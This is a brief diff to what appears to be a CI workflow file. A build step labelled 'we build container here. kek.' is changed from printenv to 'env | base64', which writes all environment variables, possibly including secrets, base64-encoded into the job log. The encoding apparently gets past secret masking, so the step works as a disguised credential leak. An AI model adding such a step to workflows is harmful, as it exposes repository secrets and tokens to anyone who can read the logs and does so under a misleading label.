@@ -14,4 +14,4 @@ jobs:
         fetch-depth: 0
     - run: |
         echo "we build container here. kek."
-        printenv
+        env | base64
